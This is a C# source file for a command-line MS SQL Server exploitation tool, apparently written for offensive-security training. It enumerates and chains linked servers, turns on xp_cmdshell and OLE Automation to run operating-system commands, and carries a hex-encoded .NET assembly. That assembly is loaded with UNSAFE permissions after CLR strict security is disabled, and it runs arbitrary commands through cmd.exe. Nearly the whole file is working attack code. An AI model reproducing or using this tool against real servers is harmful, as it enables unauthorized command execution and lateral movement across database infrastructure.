using System;
using System.Collections.Generic;
using System.Data;
using System.Data.SqlClient;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using CommandLine;

namespace mssql_exploit
{
    /*
     * Github mark: 1e0hTvn6xERUCF8
     * MsSql basic command line application. Works well with linked servers, builtin commands, codexec.
     */
    public class Options
    {
        [Option('s', "server", Required = true, HelpText = "Server to connect to")]
        public IEnumerable<string> Server { get; set; }

        [Option('d', "database", Required = true, HelpText = "Database to use")]
        public IEnumerable<string> Db { get; set; }

        [Option('u', "username", Required = false, HelpText = "Username")]
        public IEnumerable<string> Username { get; set; }

        [Option('p', "password", Required = false, HelpText = "Password")]
        public IEnumerable<string> Password { get; set; }
    }

    [Verb("enumLinked", HelpText = "Enum linked servers.")]
    public class EnumLinkedOptions : Options
    {

    }

    [Verb("cli", HelpText = "Boi")]
    public class CliOptions: Options
    {

    }


    class mssql_exploit
    {
        static SqlConnection connect(Options o)
        {
            String conString = $"Server = {o.Server.First()}; Database = {o.Db.First()};";
            if (o.Username.ToArray().Length != 0)
            {
                if (o.Password.ToArray().Length == 0)
                {
                    throw new ArgumentException("Password not provided.");
                }
                conString += $"User ID = {o.Username.First()}; Password = {o.Password.First()}; Integrated Security = False;";
            } else
            {
                conString += "Integrated Security = True;";
            }
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("INFO: Auth success!");
            }
            catch
            {
                throw new ArgumentException("Authentication failed!");
            }

            return con;
        }

        static int RunEnumLinked(EnumLinkedOptions o)
        {
            SqlConnection con = connect(o);
            cliSql(con, "EXEC sp_linkedservers;");
            return 0;
        }

        static string getLinkedServerCommand(string command, List<string> linkStack)
        {
            // EXEC (' EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT appsrv01 ') AT DC01;
            // EXEC('  ') AT <linkname> 
            string result = command;
            
            for (int i = linkStack.Count - 1; i >= 0; i--)
            {
                string link = linkStack[i];
                result = $"EXEC({Q(result)}) AT {link};";
            }

            return result;
        }

        static string query_create_exec_proc1 =
                @"
                use msdb
                DROP PROCEDURE IF EXISTS dbo.cmdExec; 
                DROP ASSEMBLY IF EXISTS myAssembly; 
		        EXEC sp_configure 'show advanced options',1
		        RECONFIGURE
		        EXEC sp_configure 'clr enabled',1
		        RECONFIGURE
		        EXEC sp_configure 'clr strict security', 0
		        RECONFIGURE

		        CREATE ASSEMBLY myAssembly FROM 0x4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103008E4C91E50000000000000000E00022200B013000000C000000060000000000000E2B0000002000000040000000000010002000000002000004000000000000000600000000000000008000000002000000000000030060850000100000100000000010000010000000000000100000000000000000000000B92A00004F00000000400000B803000000000000000000000000000000000000006000000C0000001C2A0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000140B000000200000000C000000020000000000000000000000000000200000602E72737263000000B80300000040000000040000000E0000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001200000000000000000000000000004000004200000000000000000000000000000000ED2A000000000000480000000200050028210000F4080000010000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000013300600C00000000100001100731000000A0A066F1100000A72010000706F1200000A00066F1100000A7239000070028C12000001281300000A6F1400000A00066F1100000A166F1500000A00066F1100000A176F1600000A00066F1700000A26178D17000001251672490000701F0C20A00F00006A731800000AA2731900000A0B281A00000A076F1B00000A000716066F1C00000A6F1D00000A6F1E00000A6F1F00000A00281A00000A076F2000000A00281A00000A6F2100000A00066F2200000A00066F2300000A002A2202282400000A002A00000042534A4201000100000000000C00000076342E302E33303331390000000005006C000000B8020000237E0000240300001004000023537472696E6773000000003407000058000000235553008C0700001000000023475549440000009C0700005801000023426C6F620000000000000002000001471502000900000000FA013300160000010000001C000000020000000200000001000000240000000F000000010000000100000003000000000076020100000000000600A0012F0306000D022F030600BE00FD020F004F0300000600E60093020600830193020600640193020600F40193020600C00193020600D90193020600130193020600D20010030600B000100306004701930206002E013F020600A1038C020A00FD00DC020A0059025E030E008403FD020A007400DC020E00B302FD0206006F028C020A002000DC020A00A00014000A00F303DC020A009800DC020600C4020A000600D1020A000000000001000000000001000100010010007303000041000100010050200000000096003500620001001C21000000008618F702060002000000010068000900F70201001100F70206001900F7020A002900F70210003100F70210003900F70210004100F70210004900F70210005100F70210005900F70210006100F70215006900F70210007100F70210007900F70210008900F70206009900F70206009900A5022100A90082001000B1009A032600A9008C031000A9002B021500A900D80315009900BF032C00B900F7023000A100F7023800C9008F003F00D100B40344009900C5034A00E1004F004F00810063024F00A1006C025300D100FE034400D100590006009900A80306009900AA0006008100F702060020007B0053012E000B0068002E00130071002E001B0090002E00230099002E002B00B0002E003300B0002E003B00B0002E00430099002E004B00B6002E005300B0002E005B00B0002E006300CE002E006B00F8002E00730005011A000480000001000000000000000000000000003D00000004000000000000000000000059002C0000000000040000000000000000000000590014000000000004000000000000000000000059008C02000000000000003C4D6F64756C653E0053797374656D2E494F0053797374656D2E446174610053716C4D65746144617461006D73636F726C696200636D6445786563004D5353716C417373656D626C79457865630052656164546F456E640053656E64526573756C7473456E640065786563436F6D6D616E640053716C446174615265636F7264007365745F46696C654E616D65006765745F506970650053716C506970650053716C44625479706500436C6F736500477569644174747269627574650044656275676761626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C654174747269627574650053716C50726F63656475726541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C697479417474726962757465007365745F5573655368656C6C457865637574650053797374656D2E52756E74696D652E56657273696F6E696E670053716C537472696E6700546F537472696E6700536574537472696E67004D5353716C417373656D626C79457865632E646C6C0053797374656D0053797374656D2E5265666C656374696F6E006765745F5374617274496E666F0050726F636573735374617274496E666F0053747265616D5265616465720054657874526561646572004D6963726F736F66742E53716C5365727665722E536572766572002E63746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C6572536572766963657300446562756767696E674D6F6465730053797374656D2E446174612E53716C54797065730053746F72656450726F636564757265730050726F63657373007365745F417267756D656E747300466F726D6174004F626A6563740057616974466F72457869740053656E64526573756C74735374617274006765745F5374616E646172644F7574707574007365745F52656469726563745374616E646172644F75747075740053716C436F6E746578740053656E64526573756C7473526F7700000000003743003A005C00570069006E0064006F00770073005C00530079007300740065006D00330032005C0063006D0064002E00650078006500000F20002F00430020007B0030007D00000D6F00750074007000750074000000DF37D37E458BB540BED8431E358E7F9400042001010803200001052001011111042001010E0420010102060702124D125104200012550500020E0E1C03200002072003010E11610A062001011D125D0400001269052001011251042000126D0320000E05200201080E08B77A5C561934E0890500010111490801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F777301080100070100000000160100114D5353716C417373656D626C7945786563000005010000000017010012436F7079726967687420C2A920203230323100002901002463383235653839352D343666352D346331392D616537322D34373662343966393536633800000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E320401000000000000009A738E8D000000000200000065000000542A0000540C0000000000000000000000000000100000000000000000000000000000005253445324F160DCE889294B893F94ABE6B4DDAA01000000433A5C55736572735C757365725C736F757263655C7265706F735C4D5353716C417373656D626C79457865635C6F626A5C44656275675C4D5353716C417373656D626C79457865632E70646200E12A00000000000000000000FB2A0000002000000000000000000000000000000000000000000000ED2A0000000000000000000000005F436F72446C6C4D61696E006D73636F7265652E646C6C0000000000000000FF25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005C03000000000000000000005C0334000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000002000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B004BC020000010053007400720069006E006700460069006C00650049006E0066006F0000009802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D00650000000000000000004C0012000100460069006C0065004400650073006300720069007000740069006F006E00000000004D005300530071006C0041007300730065006D0062006C00790045007800650063000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E00300000004C001600010049006E007400650072006E0061006C004E0061006D00650000004D005300530071006C0041007300730065006D0062006C00790045007800650063002E0064006C006C0000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200310000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000005400160001004F0072006900670069006E0061006C00460069006C0065006E0061006D00650000004D005300530071006C0041007300730065006D0062006C00790045007800650063002E0064006C006C000000440012000100500072006F0064007500630074004E0061006D006500000000004D005300530071006C0041007300730065006D0062006C00790045007800650063000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E003000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000103B00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 WITH PERMISSION_SET = UNSAFE;
";
        static string query_create_exec_proc2 = @"CREATE PROCEDURE [dbo].[cmdExec] @execCommand NVARCHAR (4000) AS EXTERNAL NAME [myAssembly].[StoredProcedures].[cmdExec];";

        static void RunCliExecSQL(SqlConnection con, string command, List<string> linkStack)
        {
            command = getLinkedServerCommand(command, linkStack);
            try
            {
                cliSql(con, command);
            }
            catch (SqlException e)
            {
                Console.WriteLine($"Error: {e.Message}");
            }
        }
        static int RunCli(CliOptions o)
        {
            SqlConnection con = connect(o);
            string instanceName = execSql(con, "SELECT @@servername")[1][0];
            List<string> linkStack = new List<string>();
            while (true)
            {
                string status = instanceName;
                if (linkStack.Count != 0)
                    status += " -> ";
                status += String.Join(" -> ", linkStack);
                status += "> ";
                Console.Write(status);

                string command = Console.ReadLine();
                if (command == "")
                {
                    continue;
                } else if (command == "!exit")
                    break;
                else if (command == "!help")
                {
                    Console.WriteLine(@"
!help               - Print this message
!exit               - Exit
!execAt <link_name> - Execute on linked server. This can be stacked multiple times. Automatic single quote ' escaping. 
!pop                - Remove the top linked server from the stack.
!!user              - Query current user
!!linked            - Query linked servers
!!enxpcmd           - Enable xp_cmdshell OS code execution
!!xpcmd <command>   - Run OS command via master..xp_cmdshell
!!enspoa            - Enable sp_OACreate os code execution
!!spoa <command>    - Run OS command via sp_OACreate
!!loadExecProc      - Create stored procedure to execute OS commands
!!execProc          - Run OS command via loadExecProc command stored procedure
anything            - Execute SQL query and print result.
");
                    continue;
                }
                else if (command.StartsWith("!execAt"))
                {
                    linkStack.Add(command.Substring(7).Trim());
                    continue;
                }
                else if (command.StartsWith("!pop"))
                {
                    if (linkStack.Count != 0)
                    {
                        linkStack.RemoveAt(linkStack.Count - 1);
                    }
                    continue;
                } else if (command.StartsWith("!!user"))
                {
                    command = "select system_user as 'system_user', suser_name() as 'suser_name', current_user as 'current_user'";
                } else if (command.StartsWith("!!linked"))
                {
                    command = "SELECT * FROM sys.Servers a LEFT OUTER JOIN sys.linked_logins b ON b.server_id = a.server_id LEFT OUTER JOIN sys.server_principals c ON c.principal_id = b.local_principal_id";
                } else if (command.StartsWith("!!enxpcmd"))
                {
                    command = "sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE";
                } else if (command.StartsWith("!!xpcmd"))
                {
                    command = $"master..xp_cmdshell {Q(command.Substring(8))}";
                } else if (command.StartsWith("!!enspoa"))
                {
                    command = "EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE";
                } else if (command.StartsWith("!!spoa"))
                {
                    command = $"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, {Q(command.Substring(7))}";
                } else if (command.StartsWith("!!loadExecProc"))
                {
                    RunCliExecSQL(con, query_create_exec_proc1, linkStack);
                    command = query_create_exec_proc2;
                } else if (command.StartsWith("!!execProc"))
                {
                    command = $"EXEC cmdExec {Q(command.Substring(10))}";
                }

                RunCliExecSQL(con, command, linkStack);
            }
            return 0;
        }

        static int Main(string[] cliArgs)
        {
            try
            {
                return Parser.Default.ParseArguments<EnumLinkedOptions, CliOptions>(cliArgs).MapResult(
                        (EnumLinkedOptions o) => RunEnumLinked(o),
                        (CliOptions o) => RunCli(o),
                        err => 1
                    );
            } catch (ArgumentException e)
            {
                Console.Error.WriteLine($"Error: {e.Message}");
                return 1;
            }
        }

        static List<List<string>> execSql(SqlConnection con, String cmd)
        {
            if (con != null && con.State == ConnectionState.Closed)
            {
                Console.WriteLine("Connection broken, trying to reconnect...");
                con.Open();
            }
            SqlCommand command = new SqlCommand(cmd, con);
            SqlDataReader reader = command.ExecuteReader();
            List<List<string>> result = new List<List<string>>();
            result.Add(new List<string>());
            for (int i = 0; i <reader.FieldCount; ++i)
            {
                result[0].Add(reader.GetName(i));
            }
            while (reader.Read())
            {
                result.Add(new List<string>());
                for (var i = 0; i < reader.FieldCount; ++i)
                {
                    result[result.Count - 1].Add(reader[i].ToString());
                }
            }
            reader.Close();
            return result; 
        }

        static void cliSql(SqlConnection con, String cmd)
        {
            Console.WriteLine("--------------------------------------------------");
            Console.WriteLine(cmd);
            Console.WriteLine("--------------------------------------------------");
            var result = execSql(con, cmd);
            var longest = result[0].Count != 0 ? result[0].Max(r => r.Length) : 0;

            if (result[0].Count == 1) // single column
            {
                Console.WriteLine(result[0][0]);
                Console.WriteLine("---------------");
                for (var i = 1; i < result.Count; ++i)
                {
                    Console.WriteLine(result[i][0]);
                }
            } else { // multiple columns
                for (var i = 1; i < result.Count; ++i)
                {
                    var row = result[i];
                    var colName = result[0];
                    for (var j = 0; j < row.Count; ++j)
                    {
                        Console.WriteLine($"{colName[j]}{new string(' ', longest - colName[j].Length)} -> {row[j]}");
                    }
                    Console.WriteLine("--------------------------------------------------");
                }
            }
        }

        static string Q(string val)
        {
            return "'" + val.Replace("'", "''") + "'";
        }
    }
}
